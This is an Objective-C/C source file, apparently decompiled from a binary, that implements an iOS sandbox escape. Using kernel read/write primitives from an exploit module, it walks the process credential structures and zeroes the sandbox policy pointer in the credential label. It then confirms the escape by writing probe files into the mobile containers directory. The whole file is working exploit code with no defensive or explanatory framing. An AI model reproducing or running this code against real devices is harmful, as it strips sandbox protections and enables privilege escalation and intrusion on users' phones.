// sandbox_escape.c — Sandbox escape via credential label rewriting
// Reconstructed from 5013 v3.2.17 binary (decompiled via Ghidra)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>

#import <Foundation/Foundation.h>

#include "../exploit/krw.h"
#include "../exploit/exploit.h"
#include "../exploit/offsets.h"

// Sandbox extension permission string
static const char *kReadWriteExtension = "com.apple.app-sandbox.read-write";
static const char *kRootPath = "/";

bool sandbox_access_is_active(void) {
    // Probe multiple container paths to verify sandbox escape worked
    static const char *probePaths[] = {
        "/private/var/mobile/Containers/Data",
        // second path checked in a loop
        NULL
    };

    @autoreleasepool {
        for (int i = 0; probePaths[i]; i++) {
            pid_t pid = getpid();
            NSString *uuid = [[NSUUID UUID] UUIDString];
            NSString *probeName = [NSString stringWithFormat:@"5013_access_probe_%d_%@", pid, uuid];
            NSString *dir = [NSString stringWithUTF8String:probePaths[i]];
            NSString *path = [dir stringByAppendingPathComponent:probeName];

            int fd = open([path fileSystemRepresentation],
                          O_CREAT | O_RDWR | O_TRUNC | O_EXCL, 0644);
            if (fd < 0) return false;

            char c = '1';
            long written = write(fd, &c, 1);
            char readBuf = 0;
            bool readOk = false;
            if (lseek(fd, 0, SEEK_SET) == 0) {
                readOk = (read(fd, &readBuf, 1) == 1);
            }

            int closeRet = close(fd);
            int unlinkRet = unlink([path fileSystemRepresentation]);

            bool success = false;
            if (readBuf == '1') {
                success = (written == 1) && readOk;
            }
            if (unlinkRet != 0 || closeRet != 0) {
                success = false;
            }

            if (!success) return false;
        }
    }
    return true;
}

int sandbox_escape(void) {
    extern uint64_t gSelfProc;
    uint64_t procAddr = gSelfProc;
    if (procAddr == 0) {
        NSLog(@"[sandbox_escape] gSelfProc not set");
        return -1;
    }

    // Walk: proc -> proc_ro -> p_ucred -> cr_label -> l_perpolicy -> sandbox
    uint64_t procRo = kread_ptr(procAddr + off_proc_p_proc_ro);
    NSLog(@"[sandbox_escape] proc_ro: 0x%llx", procRo);

    uint64_t ucred = kread_ptr(procRo + off_proc_ro_p_ucred);
    NSLog(@"[sandbox_escape] ucred: 0x%llx", ucred);

    if (ucred == 0) {
        NSLog(@"[sandbox_escape] failed to read ucred");
        return -1;
    }

    uint64_t crLabel = kread_ptr(ucred + off_ucred_cr_label);
    NSLog(@"[sandbox_escape] crLabel: 0x%llx", crLabel);

    if (crLabel == 0) {
        NSLog(@"[sandbox_escape] failed to read cr_label");
        return -1;
    }

    // Read sandbox slot from perpolicy array
    uint64_t sandboxSlot = kread_ptr(crLabel + off_label_l_perpolicy_sandbox);
    NSLog(@"[sandbox_escape] sandboxSlot: 0x%llx", sandboxSlot);

    // Zero out sandbox profile pointer to escape
    if (sandboxSlot != 0) {
        early_kwrite64(crLabel + off_label_l_perpolicy_sandbox, 0);
    }

    // After rewriting, verify the escape
    bool escaped = sandbox_access_is_active();
    if (escaped) {
        NSLog(@"[sandbox_escape] sandbox escape verified successfully");
        return 0;
    } else {
        NSLog(@"[sandbox_escape] sandbox escape verification FAILED");
        return -1;
    }
}
